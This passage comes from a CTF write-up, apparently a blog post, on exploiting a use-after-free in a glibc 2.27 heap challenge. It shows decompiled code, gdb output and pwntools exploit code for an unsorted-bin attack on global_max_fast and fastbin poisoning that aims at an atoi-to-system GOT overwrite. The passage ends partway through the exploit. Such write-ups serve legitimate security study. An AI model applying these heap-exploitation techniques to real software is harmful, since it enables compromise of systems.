</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">program_robot</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_15</span> <span class="p">[</span><span class="mi">5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Provide robot</span><span class="se">\&#39;</span><span class="s">s slot:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_15</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">local_15</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mi">4</span> <span class="o">&lt;</span> <span class="n">iVar1</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Slot is empty!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">robots</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">iVar1</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Program the robot:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">robots</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">iVar1</span> <span class="o">*</span> <span class="mi">8</span><span class="p">),(</span><span class="kt">long</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">robot_memory_size</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">iVar1</span> <span class="o">*</span> <span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is the <code>edit</code> function, where we can set the data of our allocated chunk. Notice that instead of using <code>check_robot_slot</code>, it still refers to the <code>robots</code> array to check whether a <code>robot</code> is freed or not.</p>
<p>That means, even though we free the <code>robot</code> chunk, we can still edit it. This is a <code>Use-After-Free</code> bug.</p>
<p>So, that&rsquo;s all the methods that can we use. Notice that there isn&rsquo;t any print or view method, which means by default, we can&rsquo;t leak anything. This will make the exploitation harder.</p>
<h3 id="exploitation-plan">Exploitation Plan</h3>
<p>Now that we&rsquo;ve known that there is a UAF bug, let&rsquo;s summarize our findings so far:</p>
<ul>
<li>GLIBC version is <code>2.27</code>
<ul>
<li>That means there is <code>tcache</code> bin, and every time we free a chunk with size &lt; <code>0x401</code>, it will go to tcache bin first until it fulls</li>
<li>When the <code>tcache</code> bin is full, based on its size, it will go to either <code>unsortedbin</code> or <code>fastbin</code>. By default, if the <code>size</code> is larger than <code>0x80</code>, it will go to <code>unsortedbin</code>. Else, it will go to <code>fastbin</code>.</li>
</ul>
</li>
<li>It uses <code>calloc</code> instead of <code>malloc</code>
<ul>
<li>What makes it differs is that <code>calloc</code> doesn&rsquo;t use <code>tcache</code> bin at all. But, it can use <code>fastbin</code> or <code>unsortedbin</code>.</li>
<li>So, if we <code>free</code> a chunk and it goes to <code>tcache</code>, if we call <code>calloc</code> again with the same freed size, it won&rsquo;t use the tcache. Instead, it will create a new chunk.</li>
</ul>
</li>
<li>No PIE and Partial Relro, which means we can overwrite GOT easily as the address is fixed (Only if we can create arbitrary write primitive).</li>
<li>There is a UAF bug in the program, which allow us to edit <code>freed</code> chunk.</li>
<li>The minimum allocation is <code>0x101</code>, which means it will go to either <code>tcache</code> or <code>unsortedbin</code>.</li>
</ul>
<p>Based on that summary, let&rsquo;s try to think about how should we attack this binary. After reading a lot of resources on the internet and thinking for a while, I found a working plan that could work. First, let&rsquo;s examine the global variable structure (To find the address, you can use gdb <code>vmmap</code> command to find the <code>rw</code> area of the binary)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gefâž¤  x/38gx 0x00000000404000
</span></span><span class="line"><span class="cl">0x404000:	0x0000000000403e20	0x00007ffff7ffe170
</span></span><span class="line"><span class="cl">0x404010:	0x00007ffff7dea8f0	0x0000000000401030
</span></span><span class="line"><span class="cl">0x404020 &lt;puts@got.plt&gt;:	0x00007ffff7a62970	0x00007ffff7af20f0
</span></span><span class="line"><span class="cl">0x404030 &lt;__stack_chk_fail@got.plt&gt;:	0x0000000000401060	0x0000000000401070
</span></span><span class="line"><span class="cl">0x404040 &lt;read@got.plt&gt;:	0x00007ffff7af2020	0x0000000000401090
</span></span><span class="line"><span class="cl">0x404050 &lt;setvbuf@got.plt&gt;:	0x00007ffff7a632a0	0x00000000004010b0
</span></span><span class="line"><span class="cl">0x404060:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x404070:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x404080 &lt;stdout@@GLIBC_2.2.5&gt;:	0x00007ffff7dce760	0x0000000000000000
</span></span><span class="line"><span class="cl">0x404090 &lt;stdin@@GLIBC_2.2.5&gt;:	0x00007ffff7dcda00	0x0000000000000000
</span></span><span class="line"><span class="cl">0x4040a0 &lt;stderr@@GLIBC_2.2.5&gt;:	0x00007ffff7dce680	0x0000000000000000
</span></span><span class="line"><span class="cl">0x4040b0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x4040c0 &lt;robot_memory_size&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x4040d0 &lt;robot_memory_size+16&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x4040e0 &lt;check_robot_slot&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x4040f0 &lt;check_robot_slot+16&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x404100 &lt;robots&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x404110 &lt;robots+16&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x404120 &lt;robots+32&gt;:	0x0000000000000000	0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that the <code>robots</code> array is located at a higher address. If we&rsquo;re somehow able to forge our good-sized chunk location so that it points to the area of <code>robot_memory_size</code> or <code>check_robot_slot</code>, we will be able to create an arbitrary write primitive, because if we call <code>program_robot</code> on that chunk, it will be able to edit <code>robots</code> array as well, where we can simply fill one of the elements with the target address that we want to overwrite, and then use <code>program_robot</code> again on the overwritten index to do arbitrary write.</p>
<p>Also because it is <code>No PIE</code>, the address is fixed, so we don&rsquo;t need a leak. Now moving to the next question, how can we forge a chunk so that it points to the global variable area?</p>
<p>Remember that <code>calloc</code> doesn&rsquo;t use tcache at all so that we can&rsquo;t poison tcache pointers. We left with forging the metadata of <code>fastbin</code> chunk, but due to the limitation where we can only allocate chunk with size larger than <code>0x101</code>, we can&rsquo;t free chunk to the <code>fastbin</code> (It will go to <code>unsortedbin</code>).</p>
<p>After reading resources, turn out <code>fastbin</code> has a variable called <code>global_max_fast</code>, which stored the maximum size of a chunk that can be freed to <code>fastbin</code>. So, we need a way to change this value, so that if we free chunk with size larger than <code>0x80</code> (the default value stored), it will go to <code>fastbin</code>.</p>
<p>The trick here is to perform <code>unsorted bin attack</code>. You can find this attack in <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.27/unsorted_bin_attack.c" target="_blank" rel="noopener noreffer ">how2heap</a> repo and this <a href="https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/unsorted_bin_attack/" target="_blank" rel="noopener noreffer ">blog</a>.</p>
<p>To give more explanation, let&rsquo;s check on the gdb first to see the structure of the unsorted bin chunk. You can just try to allocate a big chunk, and then free it in the binary.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gefâž¤  x/4gx 0x405260-0x10
</span></span><span class="line"><span class="cl">0x405250:	0x0000000000000000	0x0000000000002331
</span></span><span class="line"><span class="cl">0x405260:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
</span></span><span class="line"><span class="cl">gefâž¤  x/4gx 0x00007ffff7dcdca0
</span></span><span class="line"><span class="cl">0x7ffff7dcdca0 &lt;main_arena+96&gt;:	0x00000000004076c0	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7ffff7dcdcb0 &lt;main_arena+112&gt;:	0x0000000000405250	0x0000000000405250
</span></span><span class="line"><span class="cl">gefâž¤  x/gx &amp;global_max_fast
</span></span><span class="line"><span class="cl">0x7ffff7dcf940 &lt;global_max_fast&gt;:	0x0000000000000080
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that the unsorted bin chunk stored a pointer to the <code>main_arena+96</code>, and it is near the <code>global_max_fast</code>. Let&rsquo;s try to <code>calloc</code> the chunk again, and see what happens to the stored pointer value.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gefâž¤  x/4gx 0x00007ffff7dcdca0
</span></span><span class="line"><span class="cl">0x7ffff7dcdca0 &lt;main_arena+96&gt;:	0x00000000004076c0	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7ffff7dcdcb0 &lt;main_arena+112&gt;:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that the <code>main_arena+112</code> value is changed! So, if we&rsquo;re able to overwrite the stored pointer of the unsorted bin chunk to <code>global_max_fast-0x10</code>, then we allocate the chunk again, we will be able to overwrite <code>global_max_fast</code> value to a huge value so that whenever we freed a chunk after the <code>tcache</code> bin is full, it will go to <code>fastbin</code> (Because the max size is no longer <code>0x80</code>).</p>
<p>An important note is that, after we do this, the unsortedbin will be corrupted, so we need to ensure that all <code>calloc</code> after this point will use the cached chunks stored in the <code>fastbin</code>. We will discuss this more later.</p>
<p>Now that we found a way to manipulate the fastbin max size, we can move to how to use this in our plan. As you remember, <code>calloc</code> never use <code>tcache</code> bin, so it is very easy to make the tcache full, we just need to <code>create</code> and <code>free</code> it repeatedly. And after it&rsquo;s full, when we freed a chunk, it will go to <code>fastbin</code>, and <code>calloc</code> is now able to use cached chunk.</p>
<p>Now, remember that we have UAF bug where we can edit <code>robot</code> after it is freed. That means if we&rsquo;re able to free some <code>robots</code> to the fastbin, we can simply overwrite the fastbin linked list pointer so that it points to our targeted address. And then after <code>calloc</code>, we will get our arbitrary write primitive that we covered before.</p>
<p>To summarize the rough plan:</p>
<ul>
<li>Do unsorted bin attack to overwrite <code>global_max_fast</code></li>
<li>Now, freed some chunks to the <code>fastbin</code></li>
<li>With UAF, overwrite the chunks stored pointer to our targeted address.</li>
<li>Allocate it</li>
<li>And now, we got a <code>robot</code> which stores a pointer that points to our targeted address, and we can tamper its data (For example, we can use this to overwrite the GOT table).</li>
</ul>
<p>Remember that we still don&rsquo;t have a leak up to this point. Because of it, my solution required us to do some brute forcing. The detailed explanation will come in the detailed solution</p>
<h3 id="detailed-solution">Detailed Solution</h3>
<p>Now, based on those rough plans, let&rsquo;s try to do detailed steps on how will we exploit this. To make our life easier, let&rsquo;s try to create a helper first</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;size:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;slot:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;robot:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;slot:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After that, let&rsquo;s prepare some offset that we will use later during doing GOT overwriting.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Due to no leak, we need to bruteforce so that this solution will work only if the last two bytes</span>
</span></span><span class="line"><span class="cl"><span class="c1"># of the libc base is 00 00 (0x0000)</span>
</span></span><span class="line"><span class="cl"><span class="n">global_max_fast</span> <span class="o">=</span> <span class="mh">0xd940</span> <span class="c1"># This is the only offset that will work</span>
</span></span><span class="line"><span class="cl"><span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0xf420</span> <span class="c1"># This is the only offset that will work</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Remember that we don&rsquo;t have any leaks, so brute forcing is required.</p>
<p>In this solution, we plan to overwrite <code>atoi</code> GOT address with <code>system</code> offset. The assumption is that this solution will work only and only if:</p>
<ul>
<li>The libc base address two least significant bytes is <code>0x0000</code>. For example <code>0x007ffff79e0000</code> will work.</li>
</ul>
<p>Only if the base address fulfills those criteria that our solution will be able to work. Why? Because on libc 2.27:</p>
<ul>
<li>The Offset of <code>atoi</code> is <code>0x40670</code></li>
<li>The Offset of <code>system</code> is <code>0x4f420</code>
<ul>
<li>If the libc base address two least significant bytes starting with 0x0000, then we can partially overwrite two bytes of the GOT entry of <code>atoi</code>.</li>
<li>For example, if the base starts with <code>0x1000</code>, that means the <code>atoi</code> address will be <code>0x41670</code>, and <code>system</code> is <code>0x50420</code>. Notice that if we overwrite two bytes of the <code>atoi</code> with <code>0x0420</code>, it will become <code>0x40420</code>, and it isn&rsquo;t the correct address for <code>system</code></li>
</ul>
</li>
</ul>
<p>Now we have found the correct offset, let&rsquo;s move to the heap exploitation.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Fill tcache[0x110] until it got full</span>
</span></span><span class="line"><span class="cl"><span class="n">tcache_size</span> <span class="o">=</span> <span class="mh">0x108</span>
</span></span><span class="line"><span class="cl"><span class="n">offset_increment</span> <span class="o">=</span> <span class="mh">0x260</span> <span class="c1"># Based on gdb observation, when we create the first chunk, the offset will be heap_offset + 0x260</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span> <span class="c1"># We can do this because calloc doesn&#39;t use tcache</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">tcache_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Fulfill tcache...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Our target is to fulfill the tcache[0x110] bin. Because calloc doesn&rsquo;t use tcache, we can simply repeatedly <code>create</code> and <code>free</code> to fulfill the tcache.</p>
<p>Let&rsquo;s check on gdb</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gefâž¤  heap bins tcache
</span></span><span class="line"><span class="cl">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Tcachebins for thread 1 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span class="line"><span class="cl">Tcachebins[idx=15, size=0x110, count=7] â†  Chunk(addr=0x4058c0, size=0x110, flags=PREV_INUSE)  â†  Chunk(addr=0x4057b0, size=0x110, flags=PREV_INUSE)  â†  Chunk(addr=0x4056a0, size=0x110, flags=PREV_INUSE)  â†  Chunk(addr=0x405590, size=0x110, flags=PREV_INUSE)  â†  Chunk(addr=0x405480, size=0x110, flags=PREV_INUSE)  â†  Chunk(addr=0x405370, size=0x110, flags=PREV_INUSE)  â†  Chunk(addr=0x405260, size=0x110, flags=PREV_INUSE) 
</span></span></code></pre></td></tr></table>
</div>
</div><p>And yup, tcache is full now. Let&rsquo;s move to the next step, which is trying to overwrite <code>global_max_fast</code> value.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Create two chunk with size 0x108</span>
</span></span><span class="line"><span class="cl"><span class="c1"># These will be used later</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">tcache_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create huge chunk</span>
</span></span><span class="line"><span class="cl"><span class="n">max_size</span> <span class="o">=</span> <span class="mh">0x2700</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">max_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create small chunk, so that when we free huge chunk, it won&#39;t get consolidated</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x111</span><span class="p">)</span> <span class="c1"># This will be used as fake chunk later. We need to set the size to 0x111</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># Go to unsorted bin</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Now we have unsorted bin chunk&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, what we do:</p>
<ul>
<li>Create 2 small chunks with size <code>0x108</code>, so that later when we freed this, it will go to <code>fastbin</code> when we have overwritten the <code>global_max_fast</code>.</li>
<li>Create a huge chunk with size <code>0x2700</code>. Later, when we free this, it will go to unsortedbin.</li>
<li>Create two more small chunks just below the huge chunk with size specifically <code>0x111</code> for 2 reasons:
<ul>
<li>So that when we free the huge chunk, it won&rsquo;t be consolidated.</li>
<li>So that the last entry of <code>robot_memory_size</code> will store value <code>0x111</code>. This will be important later when we want to create the arbitrary write primitive.</li>
</ul>
</li>
</ul>
<p>Let&rsquo;s check in gdb:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gefâž¤  heap bins unsorted
</span></span><span class="line"><span class="cl">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Unsorted Bin for arena at 0x7ffff7dcdc40 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span class="line"><span class="cl">[+] unsorted_bins[0]: fw=0x405be0, bk=0x405be0
</span></span><span class="line"><span class="cl"> â†’   Chunk(addr=0x405bf0, size=0x2710, flags=PREV_INUSE)
</span></span><span class="line"><span class="cl">[+] Found 1 chunks in unsorted bin.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, we can start our unsorted bin attack via UAF.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># With UAF, modify the unsorted bin chunk bk to the global_max_fast-0x10</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">global_max_fast</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)[:</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Now bk point to global_max_fast&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
